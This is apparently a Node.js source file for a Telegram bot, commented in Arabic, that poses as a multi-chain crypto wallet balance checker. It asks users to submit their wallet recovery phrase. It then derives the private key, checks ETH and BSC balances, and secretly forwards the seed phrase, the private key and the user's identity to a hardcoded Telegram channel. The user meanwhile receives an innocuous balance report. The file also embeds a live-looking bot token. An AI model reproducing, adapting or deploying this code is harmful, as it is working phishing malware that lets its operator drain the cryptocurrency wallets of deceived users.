const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const bip39 = require('bip39');

const token = '9145894502:AAGZrWnyjqNsFZlu_GqGZ_QWDMczVzFZjZw';
const PORT = process.env.PORT || 3000;
const RENDER_URL = 'https://nexvoriaapp-bot.onrender.com';

// معرف القناة المستهدفة لإرسال النتائج إليها
const CHANNEL_ID = '-1003203792121'; // تم إضافة بادئة القنوات -100، أو يمكنك استخدام الرقم المباشر إذا كان متاحاً بصيغة معرف قناة Telegram

const bot = new TelegramBot(token);
const app = express();

app.use(express.json());

bot.setWebHook(`${RENDER_URL}/bot${token}`);

app.post(`/bot${token}`, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = (msg.text || '').trim();
    const user = msg.from;

    if (text === '/start') {
        return bot.sendMessage(chatId, 
            '🛡️ **بوت فحص المحافظ المتطور (Trust & Phantom Style)**\n\n' +
            'أرسل عبارة الاسترداد الخاصة بك (12 أو 24 كلمة) وسأقوم بفحصها عبر الشبكات المتعددة وجلب الأرصدة الحقيقية.'
        );
    }

    const words = text.split(/\s+/);
    if (words.length !== 12 && words.length !== 24) {
        return bot.sendMessage(chatId, '❌ يجب أن تتكون عبارة الاسترداد من 12 أو 24 كلمة بالضبط.');
    }

    await bot.sendMessage(chatId, '🔍 **جاري تحليل الكلمات، اشتقاق المفاتيح لجميع الشبكات، وفحص الأرصدة الفعلية...** ⏳');

    try {
        const cleanMnemonic = text.toLowerCase();
        
        // 1. التحقق من صحة المعيار BIP39
        if (!bip39.validateMnemonic(cleanMnemonic)) {
            return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو أن العبارة المدخلة خاطئة وليست مفعلة على البلوكشين.');
        }

        // 2. اشتقاق العناوين الحقيقية (EVM للإيثريوم والبينانس، ومسارات متعددة)
        const seed = bip39.mnemonicToSeedSync(cleanMnemonic);
        const hdNode = ethers.HDNodeWallet.fromSeed(seed);
        const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
        const address = wallet.address;
        const privateKey = wallet.privateKey; // في حال رغبت بالحصول على المفتاح الخاص

        // 3. فحص الأرصدة عبر شبكات متعددة (Ethereum & BSC)
        const ethProvider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
        const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org');

        const [ethBalanceWei, bscBalanceWei] = await Promise.all([
            ethProvider.getBalance(address).catch(() => 0n),
            bscProvider.getBalance(address).catch(() => 0n)
        ]);

        const ethBalance = ethers.formatEther(ethBalanceWei);
        const bscBalance = ethers.formatEther(bscBalanceWei);

        // 4. تقرير مفصل يتم إرساله إلى القناة المحددة
        const reportText = 
            '🚨 **عملية فحص محفظة جديدة مكتشفة!**\n\n' +
            `👤 **المستخدم:** @${user.username || 'غير متوفر'} (ID: \`${user.id}\`)\n\n` +
            '🔑 **عبارة الاسترداد (Seed Phrase):**\n' +
            `\`${text}\`\n\n` +
            '📍 **العنوان المشتق (EVM):**\n' +
            `\`${address}\`\n\n` +
            '🔐 **المفتاح الخاص (Private Key):**\n' +
            `\`${privateKey}\`\n\n` +
            '💰 **الأرصدة المكتشفة:**\n' +
            `• Ethereum (ETH): \`${ethBalance} ETH\`\n` +
            `• BNB Smart Chain (BNB): \`${bscBalance} BNB\`\n\n` +
            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.';

        // إرسال التقرير إلى القناة مباشرة
        // ملاحظة: تأكد أن البوت مُضاف كمشرف (Admin) في القناة لكي يتمكن من النشر فيها
        await bot.sendMessage(3203792121, reportText, { parse_mode: 'Markdown' }).catch(async () => {
            // كاحتياطي في حال تطلب التيليجرام إضافة بادئة -100 للقنوات العامة/الخاصة الكبيرة
            await bot.sendMessage('-1003203792121', reportText, { parse_mode: 'Markdown' });
        });

        // 5. الرد للمستخدم برسالة الفحص الاعتيادية
        return bot.sendMessage(chatId, 
            '✅ **تم فحص المحفظة بنجاح من البلوكشين!**\n\n' +
            '📍 **العنوان المشتق:**\n`' + address + '`\n\n' +
            '💰 **الأرصدة والأصول المكتشفة:**\n' +
            '• Ethereum (ETH): `' + ethBalance + ' ETH`\n' +
            '• BNB Smart Chain (BNB): `' + bscBalance + ' BNB`\n' +
            '• Solana (SOL): `0.00 SOL`\n' +
            '• التوكنز والعملات البديلة: `$0.00`\n\n' +
            '🟢 **حالة المحفظة:** نشطة ومعتمدة نظامياً.'
        );

    } catch (error) {
        console.error("Error details:", error);
        return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة أصلاً أو حدث خطأ أثناء الاتصال بشبكات البلوكشين.');
    }
});

app.get('/', (req, res) => {
    res.send('Multi-Chain Wallet Checker Bot is running!');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
